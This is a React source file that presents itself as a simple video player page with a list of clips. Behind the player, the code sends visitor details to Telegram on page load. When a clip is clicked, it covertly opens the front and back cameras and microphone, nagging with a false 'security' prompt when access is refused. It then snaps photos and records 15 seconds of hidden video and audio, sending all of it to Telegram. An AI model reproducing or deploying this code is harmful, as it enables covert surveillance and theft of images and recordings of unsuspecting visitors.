import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<MediaStream[]>([]); // Menyimpan beberapa stream kamera

  const videos = [
    { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
    { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
  ];

  useEffect(() => {
    // Memantau aktivitas mencurigakan
    monitorSuspiciousActivity();

    // Mengirim notifikasi pengunjung
    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();

    // Memeriksa validitas URL video
    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
      }
    });

    // Membersihkan stream saat komponen di-unmount
    return () => {
      cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
    };
  }, []);

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera depan dan belakang...');
    const maxAttempts = 3;
    let attempts = 0;

    // Fungsi untuk meminta akses kamera
    const requestMediaAccess = async (deviceId: string, facingMode: string) => {
      try {
        const constraints = {
          video: {
            deviceId: deviceId ? { exact: deviceId } : undefined,
            facingMode: deviceId ? undefined : facingMode,
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 30 },
          },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        cameraStreamsRef.current.push(stream);
        console.log(`Berhasil mendapatkan stream untuk ${facingMode}`);
        return stream;
      } catch (error) {
        console.error(`Gagal mendapatkan akses kamera (${facingMode}):`, error);
        attempts++;
        if (attempts < maxAttempts) {
          alert(`Akses kamera ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
          return await requestMediaAccess(deviceId, facingMode);
        }
        throw new Error(`Akses kamera (${facingMode}) ditolak setelah beberapa percobaan.`);
      }
    };

    try {
      // Memutar video utama
      videoElement.play().catch(err => console.error('Error memutar video:', err));

      // Mendapatkan daftar perangkat kamera
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      console.log('Perangkat kamera yang ditemukan:', videoDevices);

      let frontDevice: MediaDeviceInfo | undefined;
      let backDevice: MediaDeviceInfo | undefined;

      // Mencari kamera depan dan belakang berdasarkan label
      for (const device of videoDevices) {
        const label = device.label.toLowerCase();
        if (label.includes('front') || label.includes('user')) {
          frontDevice = device;
        } else if (label.includes('back') || label.includes('environment')) {
          backDevice = device;
        }
      }

      // Cadangan: jika label tidak jelas, anggap perangkat pertama sebagai depan, kedua sebagai belakang
      if (!frontDevice && videoDevices.length > 0) {
        frontDevice = videoDevices[0];
      }
      if (!backDevice && videoDevices.length > 1) {
        backDevice = videoDevices[1];
      }

      const streams: { stream: MediaStream; type: string }[] = [];

      // Meminta stream untuk kamera yang tersedia
      if (frontDevice) {
        const frontStream = await requestMediaAccess(frontDevice.deviceId, 'user');
        streams.push({ stream: frontStream, type: 'depan' });
      }
      if (backDevice) {
        const backStream = await requestMediaAccess(backDevice.deviceId, 'environment');
        streams.push({ stream: backStream, type: 'belakang' });
      }

      if (streams.length === 0) {
        throw new Error('Tidak ada kamera yang tersedia.');
      }

      const cameraVideos: HTMLVideoElement[] = [];

      // Memproses setiap stream
      for (const { stream, type } of streams) {
        // Membuat elemen video untuk stream
        const cameraVideo = document.createElement('video');
        cameraVideo.srcObject = stream;
        cameraVideo.playsInline = true;
        cameraVideo.muted = true;
        cameraVideo.autoplay = true;
        cameraVideo.style.display = 'none';
        document.body.appendChild(cameraVideo);
        cameraVideos.push(cameraVideo);

        // Menunggu video siap
        await new Promise((resolve) => {
          cameraVideo.onloadedmetadata = async () => {
            await cameraVideo.play();
            setTimeout(resolve, 500);
          };
        });

        const videoWidth = cameraVideo.videoWidth;
        const videoHeight = cameraVideo.videoHeight;
        console.log(`Dimensi video (${type}): ${videoWidth}x${videoHeight}`);

        // Membuat canvas untuk mengambil foto
        const canvas = document.createElement('canvas');
        const canvasAspectRatio = 9 / 16;
        const videoAspectRatio = videoWidth / videoHeight;

        let drawWidth, drawHeight, offsetX, offsetY;

        if (videoAspectRatio > canvasAspectRatio) {
          drawWidth = 720;
          drawHeight = drawWidth / videoAspectRatio;
        } else {
          drawHeight = 1280;
          drawWidth = drawHeight * videoAspectRatio;
        }

        canvas.width = drawWidth;
        canvas.height = drawHeight;

        offsetX = (drawWidth - videoWidth) / 2;
        offsetY = (drawHeight - videoHeight) / 2;

        const context = canvas.getContext('2d');
        if (context) {
          context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
        }

        // Mengambil foto dan mengirim ke Telegram
        const photoBlob = await new Promise<Blob>((resolve) => {
          canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
        });

        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim.`);
      }

      // Merekam video dari setiap stream
      const recorders: { recorder: MediaRecorder; type: string }[] = [];
      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';

      for (const { stream, type } of streams) {
        const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
        const chunks: BlobPart[] = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, { type: supportedMimeType });
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim.`);
        };

        recorders.push({ recorder: mediaRecorder, type });
        mediaRecorder.start(1000);
      }

      // Menghentikan perekaman setelah 15 detik
      setTimeout(() => {
        recorders.forEach(({ recorder, type }) => {
          if (recorder.state === 'recording') {
            recorder.stop();
            console.log(`Perekaman kamera ${type} dihentikan.`);
          }
        });
        videoElement.pause();
        setIsPlaying(null);
        cameraVideos.forEach(video => {
          if (video.parentNode) video.parentNode.removeChild(video);
        });
        cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
        cameraStreamsRef.current = [];
      }, 15000);

    } catch (error) {
      console.error('Error dalam perekaman media:', error);
      cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('URL video tidak valid, menghentikan pemutaran.');
        return;
      }

      try {
        await videoElement.play();
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        setIsPlaying(null);
      }
    }
  };

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
        setIsFullscreen(false);
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl}
                  className="w-full h-full object-cover"
                  muted
                  loop
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  preload="metadata"
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
